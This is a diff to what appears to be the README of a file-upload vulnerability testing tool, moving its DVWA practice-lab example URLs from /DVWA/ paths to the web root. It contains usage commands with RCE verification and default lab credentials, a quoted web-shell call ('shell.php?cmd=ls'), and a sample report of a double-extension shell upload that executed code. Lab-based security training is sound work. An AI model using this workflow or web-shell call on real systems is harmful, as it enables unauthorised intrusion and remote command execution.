@@ -100,8 +100,8 @@ python upload_tester.py http://target.com/upload.php --base http://target.com
 ### DVWA Testing (Recommended for Learning)
 
 ```bash
-python upload_tester.py http://localhost/DVWA/vulnerabilities/upload/ \
-  --base http://localhost/DVWA/ \
+python upload_tester.py http://localhost/vulnerabilities/upload/ \
+  --base http://localhost/ \
   --dvwa-login \
   --security-level low \
   --verify-rce \
@@ -130,8 +130,8 @@ Perfect for practicing and learning:
 
 ```bash
 # Low security
-python upload_tester.py http://localhost/DVWA/vulnerabilities/upload/ \
-  --base http://localhost/DVWA/ \
+python upload_tester.py http://localhost/vulnerabilities/upload/ \
+  --base http://localhost/ \
   --dvwa-login \
   --username admin \
   --password password \
@@ -140,8 +140,8 @@ python upload_tester.py http://localhost/DVWA/vulnerabilities/upload/ \
   --report
 
 # Medium security (more restricted)
-python upload_tester.py http://localhost/DVWA/vulnerabilities/upload/ \
-  --base http://localhost/DVWA/ \
+python upload_tester.py http://localhost/vulnerabilities/upload/ \
+  --base http://localhost/ \
   --dvwa-login \
   --security-level medium \
   --threads 3 \
@@ -253,7 +253,7 @@ curl "http://target.com/uploads/shell.php?cmd=ls"
 ```json
 {
   "scan_info": {
-    "target": "http://localhost/DVWA/vulnerabilities/upload/",
+    "target": "http://localhost/vulnerabilities/upload/",
     "start_time": "2026-03-26 14:30:00",
     "payloads_tested": 24,
     "tool": "Upload-File-Vuln-Tester v2.0"
@@ -262,8 +262,8 @@ curl "http://target.com/uploads/shell.php?cmd=ls"
     {
       "technique": "Double Extension",
       "filename": "shell.php.jpg",
-      "upload_url": "http://localhost/DVWA/vulnerabilities/upload/",
-      "file_url": "http://localhost/DVWA/hackable/uploads/shell.php.jpg",
+      "upload_url": "http://localhost/vulnerabilities/upload/",
+      "file_url": "http://localhost/hackable/uploads/shell.php.jpg",
       "rce_verified": true,
       "rce_output": "www-data"
     }
